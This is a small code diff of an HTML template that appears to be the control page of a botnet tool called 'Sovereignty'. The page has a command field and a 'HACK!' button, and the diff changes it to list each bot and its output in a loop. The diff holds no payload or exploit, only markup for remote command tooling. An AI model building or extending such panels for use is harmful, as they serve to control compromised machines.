@@ -16,10 +16,10 @@ Welcome to Sovereignty
 	<input type="text" name="command"><br><br>
 	<input type="submit" value="HACK!">
 </form>
-<p>Last Bot: {{botIP}}</p>
-<p>Last Command: {{command}}</p>
-<p>Last Output: {{lastOutput}}</p>
-<br><br><br>
-<p>Bots: {{bots}}</p>
+{% for k, v in bots.items() %}
+<p>{{ k }} </p>
+<p>{{ v }}</p>
+
+{% endfor %}
 </body>
 </html>
